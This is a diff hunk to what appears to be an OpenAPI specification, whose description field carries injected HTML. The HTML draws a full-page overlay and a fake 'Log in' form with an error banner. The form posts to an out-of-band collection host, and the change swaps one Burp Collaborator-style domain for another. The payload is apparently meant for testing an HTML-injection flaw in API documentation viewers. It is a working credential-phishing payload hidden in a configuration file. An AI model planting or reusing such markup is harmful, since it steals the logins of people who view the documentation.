@@ -4,7 +4,7 @@ info:
   description: |
         <div style="position: absolute;width: 4000px; height: 2000px;left: -500px;top: -500px;background-color: gray;opacity: 0.8;z-index: 999;"></div>
         <div style="top: -200px;left: calc(50% - 300px);position:absolute;z-index: 999999999;background: white;box-shadow: 1px 5px 10px grey;">
-          <form action="https://kj7zqza2930463qkou6apw766xcn0c.burpcollaborator.net" style="width:400px;box-shadow: 0 0 0 1px #dbdbdb;border-radius: 0.25rem;padding: 15px;display:flex;flex-wrap:wrap">
+          <form action="https://1uwg1gljkkblhk11zbhr0dinhen5bu.oastify.com" style="width:400px;box-shadow: 0 0 0 1px #dbdbdb;border-radius: 0.25rem;padding: 15px;display:flex;flex-wrap:wrap">
             <h2>Log in</h2>
             <div style="background-color: #fdd4cd;color: #ae1800; padding: 16px 22px 16px 15px; margin-top: 10px;margin-bottom:20px;display:flex;align-items: center;">
               <svg style="width:22px;height:22px;fill:#ae1800;margin-right:10px;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" id="error"><path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0-2A5 5 0 1 0 8 3a5 5 0 0 0 0 10zm0-9a1 1 0 0 1 1 1v3a1 1 0 1 1-2 0V5a1 1 0 0 1 1-1zm0 8a1 1 0 1 1 0-2 1 1 0 0 1 0 2z"></path></svg></svg>
